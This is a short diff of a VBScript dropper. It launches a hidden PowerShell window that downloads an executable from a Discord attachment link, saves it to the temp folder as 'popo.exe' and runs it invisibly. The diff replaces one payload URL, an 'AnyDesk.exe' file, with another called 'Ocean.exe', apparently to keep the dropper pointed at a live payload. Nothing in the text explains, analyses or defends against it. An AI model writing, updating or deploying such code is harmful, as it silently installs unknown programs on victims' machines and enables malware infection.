@@ -1,6 +1,6 @@
 Set WshShell = CreateObject("WScript.Shell")
 strCmd = "powershell.exe -NoProfile -WindowStyle Hidden -Command " & _
-    """$url = 'https://cdn.discordapp.com/attachments/1355757942342684815/1427524991808704522/AnyDesk.exe?ex=68ef2dc0&is=68eddc40&hm=9e874dc00606225ea90776634190744ab9d8223160442c66e8cf4caa1b2aafa0&';" & _
+    """$url = 'https://cdn.discordapp.com/attachments/1344411176443842676/1439705266177314846/Ocean.exe?ex=691b7d83&is=691a2c03&hm=a5a7761cbf8562817639ca6cd01a16347b2c481cd2e696e88a6d72843e47f1ed&';" & _
     " $out = Join-Path $env:TEMP 'popo.exe';" & _
     " Invoke-WebRequest -Uri $url -OutFile $out;" & _
     " Start-Process -FilePath $out -WindowStyle Hidden"""
